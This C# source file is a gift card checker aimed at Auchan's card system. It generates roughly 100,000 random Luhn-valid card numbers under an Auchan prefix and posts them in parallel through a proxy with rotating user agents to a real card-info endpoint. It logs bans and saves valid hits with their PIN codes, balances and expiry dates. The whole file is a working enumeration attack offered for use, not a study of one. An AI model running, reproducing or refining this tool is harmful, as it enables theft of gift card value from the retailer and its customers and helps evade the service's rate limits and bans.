using System.Net;
using System.Text;
using System.Text.Json;
using AuchanGiftCardChecker.Enums;
using AuchanGiftCardChecker.Models;

namespace AuchanGiftCardChecker
{
	public class Checker(RunOptions runOptions)
    {
        private readonly RunOptions _runOptions = runOptions;

        private readonly List<int> _checkedTimestamps = [];

        private int _failure;
        private int _success;
        private int _custome;
        private int _unknown;
        private int _retry;
        private int _ban;
        private int _error;
        private int _checked;

        private int CPM => _checkedTimestamps.Count - _checkedTimestamps.RemoveAll(c => Environment.TickCount - c > 60000);

        public async Task StartAsync()
		{
            var unsuccessfulStatutes = new BotStatus[] { BotStatus.Retry, BotStatus.Ban, BotStatus.Error };
            var successStatutes = new BotStatus[] { BotStatus.Success, BotStatus.Custome, BotStatus.Unknown };

            var incrementFunctions = new Dictionary<BotStatus, Action>
            {
                { BotStatus.Failure, () => Interlocked.Increment(ref _failure) },
                { BotStatus.Success, () => Interlocked.Increment(ref _success) },
                { BotStatus.Custome, () => Interlocked.Increment(ref _custome) },
                { BotStatus.Unknown, () => Interlocked.Increment(ref _unknown) },
                { BotStatus.Retry, () => Interlocked.Increment(ref _retry) },
                { BotStatus.Ban, () => Interlocked.Increment(ref _ban) },
                { BotStatus.Error, () => Interlocked.Increment(ref _error) }
            };

            Directory.CreateDirectory("results");

            var appendText = delegate (BotStatus botStatus, string output)
            {
                using var streamWriter = File.AppendText(Path.Combine("results", $"{botStatus.ToString().ToLower()}.txt"));
                streamWriter.WriteLine(output);
            };

            var consoleLog = delegate (BotStatus botStatus, string output)
            {
                Console.ForegroundColor = botStatus switch
                {
                    BotStatus.Failure => ConsoleColor.Red,
                    BotStatus.Success => ConsoleColor.Green,
                    BotStatus.Custome => ConsoleColor.Yellow,
                    BotStatus.Unknown => ConsoleColor.Cyan,
                    _ => ConsoleColor.White
                };

                Console.Write(botStatus.ToString().ToUpper());
                Console.ResetColor();
                Console.WriteLine($" {output}");
            };

            bool IsValidLuhn(string input)
            {
                return input.All(char.IsDigit) && input.Reverse()
                    .Select(c => c - 48)
                    .Select((thisNum, i) => i % 2 == 0
                        ? thisNum
                        : ((thisNum *= 2) > 9 ? thisNum - 9 : thisNum)
                    ).Sum() % 10 == 0;
            }

            var random = new Random();

            var cards = Enumerable.Range(0, 100_000).Select(i => $"6399020054{random.Next(0, 999999):000000}{random.Next(0, 99999):00000}").Where(IsValidLuhn).ToArray();

            Console.WriteLine($"{cards.Length} cards loaded");

            var proxySplit = _runOptions.Proxy.Split(':');

            var webProxy = new WebProxy($"http://{proxySplit[0]}:{proxySplit[1]}", true, null, proxySplit.Length == 4 ? new NetworkCredential(proxySplit[2], proxySplit[3]) : null);

            string[] GetUserAgents()
            {
                if (File.Exists("user-agents.json"))
                {
                    var fileContent = File.ReadAllText("user-agents.json");

                    var json = JsonSerializer.Deserialize<JsonElement>(fileContent);

                    var userAgents = json.EnumerateArray().Select(j => j.GetProperty("USER_AGENT").GetString()).ToArray();

                    Console.WriteLine($"{userAgents.Length} user-agents loaded");

                    return userAgents;
                }

                Console.WriteLine("'user-agents.json' file does not exist.");

                Environment.Exit(0);

                return null;
            }

            var userAgents = GetUserAgents();

            async Task checkProcess(string card, CheckResult checkResult, CancellationToken token)
            {
                try
                {
                    using var httpClientHandler = new HttpClientHandler()
                    {
                        Proxy = webProxy
                    };

                    using var httpClient = new HttpClient(httpClientHandler)
                    {
                        Timeout = TimeSpan.FromSeconds(10)
                    };

                    using var requestMessage = new HttpRequestMessage(HttpMethod.Post, "https://auchan.ogloba.com/gc-web-rgw/v3/webpos/cardInfo")
                    {
                        Content = new StringContent($"{{\"cardNumber\":\"{card}\"}}", Encoding.UTF8, "application/json")
                    };

                    requestMessage.Headers.UserAgent.TryParseAdd(userAgents[random.Next(userAgents.Length)]);

                    requestMessage.Headers.TryAddWithoutValidation("Accept-Language", "fr");
                    requestMessage.Headers.TryAddWithoutValidation("Origin", "https://carte-cadeau.auchan.fr");
                    requestMessage.Headers.TryAddWithoutValidation("Referer", "https://carte-cadeau.auchan.fr");
                    requestMessage.Headers.TryAddWithoutValidation("Web-Token", "eGiftCardToken");

                    using var responseMessage = await httpClient.SendAsync(requestMessage, token);

                    var responseContent = await responseMessage.Content.ReadAsStringAsync(token);

                    if (responseContent.Contains("Numéro de carte ou code Pin incorrect"))
                    {
                        checkResult.Status = BotStatus.Failure;
                        return;
                    }
                    else if (responseContent.Contains("activateDate"))
                    {
                        checkResult.Status = BotStatus.Success;
                    }
                    else
                    {
                        checkResult.Status = BotStatus.Ban;
                        return;
                    }

                    var json = JsonSerializer.Deserialize<JsonElement>(responseContent);

                    if (json.TryGetProperty("pinCode", out var pinCodeElement)) checkResult.Captures["code"] = pinCodeElement.GetRawText();
                    if (json.TryGetProperty("cardBalance", out var cardBalanceElement)) checkResult.Captures["balance"] = cardBalanceElement.GetRawText();
                    if (json.TryGetProperty("expireDate", out var expireDateElement)) checkResult.Captures["expire"] = expireDateElement.GetRawText();
                }
                catch (Exception error)
                {
                    if (_runOptions.Verbose) Console.WriteLine(error.Message);

                    checkResult.Status = BotStatus.Error;
                }
            }

            _ = StartUpdatingConsoleAsync();

            await Parallel.ForEachAsync(cards, new ParallelOptions() { MaxDegreeOfParallelism = _runOptions.Bots }, async (card, token) =>
            {
                while (CPM > _runOptions.MaxCPM) await Task.Delay(25, token);

                var result = new CheckResult();

                async Task RunCheckProcess()
                {
                    result = new CheckResult();

                    for (var attempts = 0; attempts < 10; attempts++)
                    {
                        await checkProcess(card, result, token);

                        if (unsuccessfulStatutes.Contains(result.Status)) incrementFunctions[result.Status].Invoke();
                        else return;
                    }

                    result.Status = BotStatus.Unknown;
                }

                await RunCheckProcess();

                var output = result.Captures.Any() ? $"{card} | {string.Join(" | ", result.Captures.Select(c => $"{c.Key} = {c.Value}"))}" : card;

                if (successStatutes.Contains(result.Status)) lock (appendText) appendText.Invoke(result.Status, output);

                if (successStatutes.Contains(result.Status) || _runOptions.Verbose) lock (consoleLog) consoleLog.Invoke(result.Status, output);

                if (incrementFunctions.TryGetValue(result.Status, out var increment)) increment.Invoke();

                Interlocked.Increment(ref _checked);

                _checkedTimestamps.Add(Environment.TickCount);
            });
        }

        private async Task StartUpdatingConsoleAsync()
        {
            var title = new StringBuilder();

            while (true)
            {
                title
                     .Append(AppDomain.CurrentDomain.FriendlyName)
                     .Append(" | Success: ")
                     .Append(_success)
                     .Append(" Unknown: ")
                     .Append(_unknown)
                     .Append(" Failure: ")
                     .Append(_failure)
                     .Append(" Retry: ")
                     .Append(_retry)
                     .Append(" Ban: ")
                     .Append(_ban)
                     .Append(" Error: ")
                     .Append(_error)
                     .Append(" Checked: ")
                     .Append(_checked)
                     .Append(" CPM: ")
                     .Append(CPM);

                Console.Title = title.ToString();

                title.Clear();

                await Task.Delay(100);
            }
        }
    }
}

